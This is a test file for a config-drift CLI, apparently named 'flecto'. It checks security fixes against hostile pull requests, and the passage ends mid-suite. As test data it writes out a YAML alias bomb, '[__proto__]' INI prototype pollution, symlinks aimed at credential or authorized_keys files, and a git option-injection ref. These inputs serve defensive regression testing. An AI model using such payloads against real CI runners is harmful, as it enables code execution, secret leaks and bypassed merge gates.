import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import {
  mkdirSync,
  mkdtempSync,
  writeFileSync,
  readFileSync,
  rmSync,
  existsSync,
  realpathSync,
  symlinkSync,
} from 'fs';
import { dirname, join, resolve } from 'path';
import { tmpdir } from 'os';
import { spawn, spawnSync } from 'child_process';

const rootIndex = resolve(process.cwd(), 'index.js');

/**
 * Kill a spawned CLI process and wait for it to be gone, so teardown never
 * races a still-exiting process for the directory it was running in (Windows
 * refuses to remove a directory a live process still holds open).
 * @param {import('child_process').ChildProcess | undefined | null} child
 * @param {number} timeoutMs
 */
async function stopChild(child, timeoutMs = 5000) {
  if (!child) return;
  if (child.exitCode !== null || child.signalCode !== null) return;
  child.kill();
  await new Promise((done) => {
    const timer = setTimeout(done, timeoutMs);
    child.once('exit', () => {
      clearTimeout(timer);
      done();
    });
  });
}

/**
 * A project a hostile pull request could produce: a config file, a baseline, a
 * plugin that records having run, and a `.flectorc` pointing at it.
 * @param {string} pluginPath value written into .flectorc's plugins array
 * @returns {{ dir: string, marker: string }}
 */
function hostileProject(pluginPath) {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-')));
  const marker = join(dir, 'EXECUTED');
  writeFileSync(join(dir, 'c.json'), JSON.stringify({ a: 1 }), 'utf8');
  writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { a: 0 } }), 'utf8');
  writeFileSync(
    join(dir, 'p.js'),
    "import { writeFileSync } from 'fs';\n"
    + 'writeFileSync(process.env.FLECTO_TEST_MARKER, "executed");\n'
    + 'export function evaluate() { return []; }\n',
    'utf8',
  );
  if (pluginPath !== null) {
    writeFileSync(join(dir, '.flectorc'), JSON.stringify({ defaults: { plugins: [pluginPath] } }), 'utf8');
  }
  return { dir, marker };
}

/**
 * @param {string} dir
 * @param {string[]} args
 * @param {Record<string, string>} [env]
 */
function runFlecto(dir, args, env = {}) {
  return spawnSync(process.execPath, [rootIndex, ...args], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, FLECTO_TEST_MARKER: join(dir, 'EXECUTED'), ...env },
  });
}

describe('policy plugins are not loaded from an untrusted .flectorc', () => {
  test('a plugin declared in .flectorc does not execute (GHSA-wq8m-fc3q-8m5x)', () => {
    // The core of the vulnerability: a pull request that adds .flectorc and a
    // plugin file achieves code execution on the CI runner, because `flecto ci`
    // is what runs on pull requests and takes no attacker-supplied flags.
    const { dir, marker } = hostileProject('./p.js');
    try {
      const run = runFlecto(dir, ['ci', 'c.json', '--snapshot-ref', 'snap.json']);
      assert.equal(existsSync(marker), false, 'plugin from .flectorc must not execute');
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing to load policy plugins declared in \.flectorc/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('compare refuses rc-declared plugins too', () => {
    const { dir, marker } = hostileProject('./p.js');
    try {
      const run = runFlecto(dir, ['compare', 'c.json', 'c.json']);
      assert.equal(existsSync(marker), false);
      assert.match(run.stderr, /Refusing to load policy plugins/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('it fails loudly rather than skipping the plugin silently', () => {
    // A plugin that stopped running without saying so would quietly weaken a
    // policy gate the operator believes is enforced — a different failure, but
    // still a failure. The run must not succeed.
    const { dir } = hostileProject('./p.js');
    try {
      const run = runFlecto(dir, ['ci', 'c.json', '--snapshot-ref', 'snap.json']);
      assert.equal(run.status, 1);
      assert.equal(run.stdout.trim(), '', 'no findings output on a refused run');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('an rc plugin outside the project is refused even with the opt-in set', () => {
    const { dir, marker } = hostileProject('../../../../../../tmp/elsewhere.mjs');
    try {
      const run = runFlecto(dir, ['ci', 'c.json', '--snapshot-ref', 'snap.json'], {
        FLECTO_ALLOW_RC_PLUGINS: '1',
      });
      assert.equal(existsSync(marker), false);
      assert.equal(run.status, 1);
      assert.match(run.stderr, /outside the project/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('FLECTO_ALLOW_RC_PLUGINS lets a trusted in-project rc plugin run', () => {
    const { dir, marker } = hostileProject('./p.js');
    try {
      runFlecto(dir, ['ci', 'c.json', '--snapshot-ref', 'snap.json'], {
        FLECTO_ALLOW_RC_PLUGINS: '1',
      });
      assert.equal(existsSync(marker), true, 'the documented opt-in must still work');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('an explicit --plugins still runs, including outside the project', () => {
    // The flag is operator intent, not attacker input. Shared policy modules
    // living outside the working directory are a legitimate monorepo setup.
    const { dir, marker } = hostileProject(null);
    try {
      runFlecto(dir, ['ci', 'c.json', '--snapshot-ref', 'snap.json', '--plugins', './p.js']);
      assert.equal(existsSync(marker), true, '--plugins must keep working');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a config with no plugins is unaffected', () => {
    const { dir } = hostileProject(null);
    try {
      writeFileSync(join(dir, '.flectorc'), JSON.stringify({ defaults: { policies: ['default'] } }), 'utf8');
      const run = runFlecto(dir, ['ci', 'c.json', '--snapshot-ref', 'snap.json']);
      assert.equal(run.status, 1, 'a real diff still exits 1');
      assert.doesNotMatch(run.stderr, /Refusing to load policy plugins/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('denial-of-service hardening (#121)', () => {
  // Secret detection runs on every changed string value under the default pack,
  // so a single pathological value in an attacker's pull request must not hang
  // the CI runner. These bound the *shape* of the cost: the pre-fix regexes were
  // O(n²) and a ~500 KB value took tens of seconds / hung; linear scanning of
  // 1 MB is well under a second. A generous ceiling keeps the test from flaking
  // while still failing loudly if quadratic behavior returns.
  const BUDGET_MS = 5_000;

  test('a long value with a private-key prefix and no terminator scans linearly', async () => {
    const { redactSecretString, looksLikeSecret } = await import('../src/secrets.js');
    const value = `-----BEGIN PRIVATE KEY-----${'A'.repeat(1_000_000)}`;
    const start = Date.now();
    looksLikeSecret(value);
    redactSecretString(value);
    assert.ok(Date.now() - start < BUDGET_MS, 'private-key scan must be linear');
  });

  test('a long value that never contains :// scans linearly', async () => {
    const { redactSecretString } = await import('../src/secrets.js');
    const value = `${'a'.repeat(1_000_000)}://`;
    const start = Date.now();
    redactSecretString(value);
    assert.ok(Date.now() - start < BUDGET_MS, 'url-credential scan must be linear');
  });

  test('a real private key is still detected and redacted after the rewrite', async () => {
    const { detectSecretKind, redactSecretString } = await import('../src/secrets.js');
    const pem = '-----BEGIN RSA PRIVATE KEY-----\nMIIBrealkeymaterialAAAA==\n-----END RSA PRIVATE KEY-----';
    assert.equal(detectSecretKind(pem), 'private-key-block');
    assert.ok(!redactSecretString(pem).includes('MIIBrealkeymaterial'));
    // An unterminated fragment is still a leaked key.
    assert.equal(detectSecretKind('x -----BEGIN PRIVATE KEY-----\nMIIBleak'), 'private-key-block');
  });

  test('a YAML alias bomb fails fast instead of exhausting memory', () => {
    const dir = mkdtempSync(join(tmpdir(), 'flecto-sec-bomb-'));
    try {
      // A few hundred bytes that expand to ~10^12 nodes if realized as a tree.
      let lines = ['l0: &l0 [x,x,x,x,x,x,x,x,x,x]'];
      for (let i = 1; i < 12; i++) {
        const ref = `*l${i - 1}`;
        lines.push(`l${i}: &l${i} [${Array(10).fill(ref).join(',')}]`);
      }
      writeFileSync(join(dir, 'bomb.yaml'), `${lines.join('\n')}\n`, 'utf8');
      writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: {} }), 'utf8');

      const start = Date.now();
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'bomb.yaml', '--snapshot-ref', 'snap.json', '--allow-empty'],
        { cwd: dir, encoding: 'utf8', timeout: 20_000 },
      );
      assert.ok(Date.now() - start < 15_000, 'must not hang on an alias bomb');
      assert.equal(run.status, 1);
      assert.match(run.stderr, /too many nodes|billion laughs/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a legitimately large config (5,000 keys) still parses', async () => {
    const { parseContent } = await import('../src/parser.js');
    const obj = {};
    for (let i = 0; i < 5000; i++) obj[`k${i}`] = i;
    const parsed = parseContent('big.json', JSON.stringify(obj));
    assert.equal(Object.keys(parsed).length, 5000);
  });
});

describe('symlinked targets cannot read outside the project (#121)', () => {
  // File names are attacker-controlled on an untrusted pull request, and so is
  // what they point at. A pull request adding config/app.ini as a symlink to
  // ~/.aws/credentials gets that file parsed and its contents emitted -- into
  // the job log, the JSON envelope, and with --format pr-comment
  // --pr-comment-post into a comment on the pull request itself. The attacker
  // never controls the linked-to file, which is what makes it worth reading.

  /**
   * A repository with an in-tree link pointing at a file outside it.
   * @returns {{ dir: string, outside: string }}
   */
  function repoWithEscapingLink() {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-link-')));
    const dir = join(root, 'repo');
    mkdirSync(dir, { recursive: true });
    const outside = join(root, 'outside.yaml');
    writeFileSync(outside, 'runner_token: ghp_NOTAREALTOKEN0000000\n', 'utf8');
    writeFileSync(join(dir, 'real.yaml'), 'ok: 1\n', 'utf8');
    writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: {} }), 'utf8');
    symlinkSync(outside, join(dir, 'leaked.yaml'));
    return { dir, outside, root };
  }

  test('a glob that picks up an escaping link is refused, and nothing leaks', () => {
    const { dir, root } = repoWithEscapingLink();
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', '*.yaml', '--snapshot-ref', 'snap.json', '--format', 'json'],
        { cwd: dir, encoding: 'utf8' },
      );

      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
      assert.match(run.stderr, /FLECTO_ALLOW_SYMLINK_TARGETS/);
      assert.doesNotMatch(run.stdout, /ghp_NOTAREALTOKEN/);
      assert.doesNotMatch(run.stderr, /ghp_NOTAREALTOKEN/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('naming the link explicitly is refused too — the PR chose where it points', () => {
    const { dir, root } = repoWithEscapingLink();
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'leaked.yaml', '--snapshot-ref', 'snap.json'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('FLECTO_ALLOW_SYMLINK_TARGETS=1 opts a deliberate link back in', () => {
    const { dir, root } = repoWithEscapingLink();
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'leaked.yaml', '--snapshot-ref', 'snap.json', '--fail-on', 'error'],
        { cwd: dir, encoding: 'utf8', env: { ...process.env, FLECTO_ALLOW_SYMLINK_TARGETS: '1' } },
      );
      // The gate still fires on what it found (secret-key-changed is an error);
      // what the opt-out changes is that the file was read at all.
      assert.doesNotMatch(run.stderr, /link out of the project/);
      assert.match(run.stdout, /ghp_NOTAREALTOKEN/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('links that stay inside the project still resolve', () => {
    const { dir, root } = repoWithEscapingLink();
    try {
      symlinkSync(join(dir, 'real.yaml'), join(dir, 'alias.yaml'));
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'alias.yaml', '--snapshot-ref', 'snap.json', '--fail-on', 'error'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 0, `an in-project link must still work:\n${run.stderr}`);
      assert.match(run.stdout, /alias\.yaml/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a path named from outside the project is operator intent, not an escape', () => {
    const { dir, outside, root } = repoWithEscapingLink();
    try {
      // `flecto compare /a/x.yaml /b/y.yaml` is a real thing to do, and nothing
      // about it is a link escaping a repository.
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', outside, '--snapshot-ref', 'snap.json', '--fail-on', 'changed'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.doesNotMatch(run.stderr, /link out of the project/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a .flecto-snapshots that links out of the project is refused', () => {
    const { dir, root } = repoWithEscapingLink();
    try {
      const elsewhere = join(root, 'elsewhere');
      mkdirSync(elsewhere, { recursive: true });
      symlinkSync(elsewhere, join(dir, '.flecto-snapshots'));

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'real.yaml', '--snapshot'],
        { cwd: dir, encoding: 'utf8' },
      );
      // Snapshots carry config values; writing them outside the repository is
      // the same escape pointed the other way.
      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe('prototype pollution from config file contents (#121)', () => {
  // The INI parser nested a section's keys under out[section]. A section named
  // "__proto__" resolved that to Object.prototype -- which passes isPlainObject,
  // because its own prototype is null -- and every key in the section was
  // written onto the prototype of every object in the process.
  //
  // In Flecto's threat model that is a pull request adding one .ini file to a
  // repository whose CI runs `flecto ci`.

  test('a [__proto__] section is ordinary data, not a write to Object.prototype', async () => {
    const { parseIni, parseContent } = await import('../src/parser.js');

    const parsed = parseIni('[__proto__]\nisAdmin=true\ntoString=x\n');

    assert.equal(({}).isAdmin, undefined, 'Object.prototype must be untouched');
    assert.equal(typeof ({}).toString, 'function', 'Object.prototype.toString must survive');
    // The section is still visible as data: dropping it silently would hide a
    // change from the diff, which is its own kind of wrong.
    assert.ok(Object.hasOwn(parsed, '__proto__'));
    assert.deepEqual(parsed['__proto__'], { isAdmin: 'true', toString: 'x' });
    assert.equal(Object.getPrototypeOf(parsed), Object.prototype);

    const viaParseContent = parseContent('app.ini', '[constructor]\nprototype=1\n');
    assert.equal(({}).prototype, undefined);
    assert.ok(Object.hasOwn(viaParseContent, 'constructor'));
  });

  test('ordinary INI sections still nest, accumulate, and take root keys', async () => {
    const { parseIni } = await import('../src/parser.js');
    const parsed = parseIni(
      'root=top\n[db]\nhost=localhost\n[db]\nport=5432\n[cache]\nttl="60"\n',
    );
    assert.deepEqual(parsed, {
      root: 'top',
      db: { host: 'localhost', port: '5432' },
      cache: { ttl: '60' },
    });
  });

  test('a hostile .ini cannot disable a policy rule on another file in the same run', () => {
    const dir = mkdtempSync(join(tmpdir(), 'flecto-sec-proto-'));
    try {
      // severityRemap[rule.id] is a plain-object lookup, so a polluted prototype
      // answered "off" and the rule stopped firing -- for every file in the run,
      // not just the attacker's. The gate went from red to green.
      writeFileSync(
        join(dir, 'a.ini'),
        '[__proto__]\ndangerous-toggle-enabled=off\nsecret-value-detected=off\n',
        'utf8',
      );
      writeFileSync(join(dir, 'b.yaml'), 'debug: true\n', 'utf8');
      writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { debug: false } }), 'utf8');

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'a.ini', 'b.yaml', '--snapshot-ref', 'snap.json', '--fail-on', 'error'],
        { cwd: dir, encoding: 'utf8' },
      );

      assert.equal(run.status, 1, `the gate must still fail:\n${run.stdout}\n${run.stderr}`);
      assert.match(run.stdout, /dangerous-toggle-enabled/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a __proto__ key survives secret masking instead of vanishing from the output', async () => {
    const { parseContent } = await import('../src/parser.js');
    const { maskSensitiveValue } = await import('../src/renderer.js');

    const tree = parseContent('c.json', '{"__proto__": {"api_key": "AKIAIOSFODNN7EXAMPLE"}, "ok": 1}');
    const masked = maskSensitiveValue(tree, '');

    // Assigning it would have moved the subtree onto the result's prototype: the
    // value was masked, but the key disappeared from what the user is shown.
    assert.ok(Object.hasOwn(masked, '__proto__'));
    assert.equal(Object.getPrototypeOf(masked), Object.prototype);
    assert.notEqual(masked['__proto__'].api_key, 'AKIAIOSFODNN7EXAMPLE');
    assert.equal(({}).api_key, undefined);
  });
});

describe('write destinations a pull request can redirect (#121)', () => {
  /**
   * A repository whose CI runs Flecto, plus a file outside it that a runner
   * would have but a pull request could not commit — the thing a redirected
   * write lands on.
   * @param {Record<string, unknown>} [rc] `.flectorc` defaults for this repo
   */
  function repoWithOutsideFile(rc) {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-write-')));
    const dir = join(root, 'repo');
    mkdirSync(dir, { recursive: true });
    const outside = join(root, 'profile.sh');
    writeFileSync(outside, '# original\n', 'utf8');
    writeFileSync(join(dir, 'prod.yaml'), 'debug: true\n', 'utf8');
    writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { debug: false } }), 'utf8');
    if (rc) writeFileSync(join(dir, '.flectorc'), JSON.stringify({ defaults: rc }), 'utf8');
    return { dir, outside, root };
  }

  test('.flectorc cannot point --output out of the project', () => {
    // The report embeds config values and file names, both of which the pull
    // request wrote, so an unconstrained destination is a partly-chosen
    // overwrite of any file the job can reach.
    const { dir, outside, root } = repoWithOutsideFile({ output: '../profile.sh' });
    try {
      const snapshot = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'prod.yaml', '--snapshot'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(snapshot.status, 0, snapshot.stderr);

      const run = spawnSync(process.execPath, [rootIndex, 'report'], { cwd: dir, encoding: 'utf8' });
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing to write "--output"/);
      assert.match(run.stderr, /FLECTO_ALLOW_RC_WRITES/);
      assert.equal(readFileSync(outside, 'utf8'), '# original\n');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a symlinked --output destination is refused however it was named', () => {
    const { dir, outside, root } = repoWithOutsideFile();
    try {
      symlinkSync(outside, join(dir, 'report.html'));
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'report', '--output', 'report.html'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
      assert.equal(readFileSync(outside, 'utf8'), '# original\n');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a --output link whose target does not exist yet is refused too', () => {
    // The sharper half of the same attack: `existsSync` follows links, so a link
    // to a file the runner does not have *yet* reports as absent and skips the
    // check — and the write then creates it. On a runner that is
    // `~/.ssh/authorized_keys` or an unused git hook, which is a better prize
    // than overwriting a file that was already there.
    const { dir, root } = repoWithOutsideFile();
    const absent = join(root, 'authorized_keys');
    try {
      symlinkSync(absent, join(dir, 'report.html'));
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'report', '--output', 'report.html'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
      assert.ok(!existsSync(absent), 'the write never created the file outside the project');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a chain of links out of the project is followed to the end', () => {
    const { dir, root } = repoWithOutsideFile();
    const absent = join(root, 'authorized_keys');
    try {
      symlinkSync(absent, join(dir, 'hop.html'));
      symlinkSync(join(dir, 'hop.html'), join(dir, 'report.html'));
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'report', '--output', 'report.html'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
      assert.ok(!existsSync(absent));
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('an in-project link is still a fine place to write', () => {
    // The rule is about escape, not about links: a repository that points its
    // report at another name inside the checkout keeps working.
    const { dir, root } = repoWithOutsideFile();
    try {
      symlinkSync(join(dir, 'real-report.html'), join(dir, 'report.html'));
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'report', '--output', 'report.html'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 0, run.stderr);
      assert.ok(existsSync(join(dir, 'real-report.html')));
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('.flectorc cannot point --baseline out of the project', () => {
    const { dir, root } = repoWithOutsideFile({ baseline: '../accepted.json' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'prod.yaml', '--snapshot-ref', 'snap.json', '--fail-on', 'error'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing to write "--baseline"/);
      assert.ok(!existsSync(join(root, 'accepted.json')));
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('an operator naming a destination on the command line is still trusted', () => {
    const { dir, root } = repoWithOutsideFile();
    try {
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });
      const target = join(root, 'chosen.html');
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'report', '--output', target],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 0, run.stderr);
      assert.ok(existsSync(target), 'an explicit CLI destination outside the project still works');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('FLECTO_ALLOW_RC_WRITES=1 opts a deliberate rc destination back in', () => {
    const { dir, outside, root } = repoWithOutsideFile({ output: '../profile.sh' });
    try {
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });
      const run = spawnSync(process.execPath, [rootIndex, 'report'], {
        cwd: dir,
        encoding: 'utf8',
        env: { ...process.env, FLECTO_ALLOW_RC_WRITES: '1' },
      });
      assert.equal(run.status, 0, run.stderr);
      assert.match(readFileSync(outside, 'utf8'), /<!doctype html>/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a destination whose parent directories do not exist yet is still allowed', () => {
    // The check normalizes from the nearest ancestor that exists, because a path
    // that is not there cannot be canonicalized — and on Windows the fallback
    // spelling (an 8.3 short name) compares as a different directory from the
    // project root, which made an in-project path look external.
    const { dir, root } = repoWithOutsideFile({ output: 'out/reports/2026/drift.html' });
    try {
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });
      const run = spawnSync(process.execPath, [rootIndex, 'report'], { cwd: dir, encoding: 'utf8' });
      assert.equal(run.status, 0, run.stderr);
      assert.ok(existsSync(join(dir, 'out', 'reports', '2026', 'drift.html')));
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a symlinked directory on the way to the destination is refused', () => {
    const { dir, root } = repoWithOutsideFile();
    try {
      const elsewhere = join(root, 'elsewhere');
      mkdirSync(elsewhere, { recursive: true });
      symlinkSync(elsewhere, join(dir, 'reports'));
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });

      const run = spawnSync(
        process.execPath,
        [rootIndex, 'report', '--output', 'reports/nested/drift.html'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /link out of the project/);
      assert.ok(!existsSync(join(elsewhere, 'nested')));
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('an in-project destination is untouched by any of this', () => {
    const { dir, root } = repoWithOutsideFile({ output: 'reports/drift.html' });
    try {
      spawnSync(process.execPath, [rootIndex, 'watch', 'prod.yaml', '--snapshot'], { cwd: dir, encoding: 'utf8' });
      const run = spawnSync(process.execPath, [rootIndex, 'report'], { cwd: dir, encoding: 'utf8' });
      assert.equal(run.status, 0, run.stderr);
      assert.ok(existsSync(join(dir, 'reports', 'drift.html')));
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe('the merge gate cannot be turned green from .flectorc (#121)', () => {
  /** A repo whose config trips an error-severity rule against its snapshot. */
  function failingRepo(rc) {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-baseline-')));
    writeFileSync(join(dir, 'prod.yaml'), 'debug: true\n', 'utf8');
    writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { debug: false } }), 'utf8');
    if (rc) writeFileSync(join(dir, '.flectorc'), JSON.stringify({ defaults: rc }), 'utf8');
    return dir;
  }

  const gate = ['ci', 'prod.yaml', '--snapshot-ref', 'snap.json', '--fail-on', 'error'];

  test('the gate fails on the finding to begin with', () => {
    const dir = failingRepo(null);
    try {
      const run = spawnSync(process.execPath, [rootIndex, ...gate], { cwd: dir, encoding: 'utf8' });
      assert.equal(run.status, 1);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('updateBaseline declared in .flectorc is refused, not honored', () => {
    // --update-baseline records every current finding as accepted, so honoring
    // it from a file a pull request can add would let that pull request accept
    // its own findings -- overriding even a --fail-on named on the command line.
    const dir = failingRepo({ baseline: 'accepted.json', updateBaseline: true });
    try {
      const run = spawnSync(process.execPath, [rootIndex, ...gate], { cwd: dir, encoding: 'utf8' });
      assert.equal(run.status, 1, 'the gate still fails');
      assert.match(run.stderr, /updateBaseline is declared in \.flectorc, and it is refused there/);
      assert.ok(!existsSync(join(dir, 'accepted.json')), 'and no baseline was written');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a profile is not a way around it either', () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-baseline-profile-')));
    try {
      writeFileSync(join(dir, 'prod.yaml'), 'debug: true\n', 'utf8');
      writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { debug: false } }), 'utf8');
      writeFileSync(join(dir, '.flectorc'), JSON.stringify({
        profiles: { ci: { baseline: 'accepted.json', updateBaseline: true } },
      }), 'utf8');

      const run = spawnSync(
        process.execPath,
        [rootIndex, ...gate, '--profile', 'ci'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /refused there/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('--update-baseline on the command line still works, because it is the operator', () => {
    const dir = failingRepo({ baseline: 'accepted.json' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, ...gate, '--update-baseline'],
        { cwd: dir, encoding: 'utf8' },
      );
      assert.equal(run.status, 0, run.stderr);
      assert.ok(existsSync(join(dir, 'accepted.json')));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('the baseline ref cannot be chosen or weaponized from .flectorc (#121)', () => {
  // `snapshotRef` decides what every change is measured against, and it merged
  // through resolveEffectiveOptions with no gate at all. Two separate defects
  // fell out of that, and the cheaper one needs no crafted value: a ref of
  // "HEAD" compares the pull request against itself.

  /**
   * A git repo whose committed tip disables TLS and raises a pool 100x
   * relative to the `base` branch an operator would diff against.
   * @param {object | null} rc value for .flectorc `defaults`
   * @returns {string} the repo directory
   */
  function repoWithHostileCommit(rc) {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-ref-')));
    const git = (...args) => spawnSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '.');
    git('config', 'user.email', 'test@example.com');
    git('config', 'user.name', 'test');
    git('config', 'commit.gpgsign', 'false');
    writeFileSync(join(dir, 'app.yaml'), 'db:\n  pool: 5\n  tls: true\n', 'utf8');
    git('add', '-A');
    git('commit', '-qm', 'base');
    git('branch', '-q', 'base');
    writeFileSync(join(dir, 'app.yaml'), 'db:\n  pool: 500\n  tls: false\n', 'utf8');
    if (rc) writeFileSync(join(dir, '.flectorc'), JSON.stringify({ defaults: rc }), 'utf8');
    git('add', '-A');
    git('commit', '-qm', 'pull request');
    return dir;
  }

  test('the gate fails against the operator\'s ref to begin with', () => {
    const dir = repoWithHostileCommit(null);
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', 'base']);
      assert.equal(run.status, 1, 'TLS off and a 100x pool is a change');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('snapshotRef declared in .flectorc is refused, not honored', () => {
    // The whole exploit: point the baseline at the pull request's own tip and
    // every file is compared against itself, so nothing ever changed.
    const dir = repoWithHostileCommit({ snapshotRef: 'HEAD' });
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml']);
      assert.equal(run.status, 1, 'the gate still fails');
      assert.match(run.stderr, /Refusing "snapshotRef" declared in \.flectorc/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a profile is not a way around it either', () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-ref-profile-')));
    try {
      writeFileSync(join(dir, 'prod.yaml'), 'debug: true\n', 'utf8');
      writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { debug: false } }), 'utf8');
      writeFileSync(join(dir, '.flectorc'), JSON.stringify({
        profiles: { ci: { snapshotRef: 'HEAD' } },
      }), 'utf8');
      const run = runFlecto(dir, ['ci', 'prod.yaml', '--profile', 'ci']);
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing "snapshotRef" declared in \.flectorc/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a ref starting with "-" is refused before git sees it', () => {
    // `git show --output=pwned:app.yaml` writes a file and prints nothing, so
    // the baseline parsed as {}, every key read as `added`, and the default
    // --fail-on never fired: an arbitrary write and a silent pass at once.
    const dir = repoWithHostileCommit(null);
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', '--output=pwned']);
      assert.equal(run.status, 1);
      assert.match(run.stderr, /starts with "-", so git would read it as an option/);
      assert.ok(!existsSync(join(dir, 'pwned:app.yaml')), 'and git wrote nothing');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

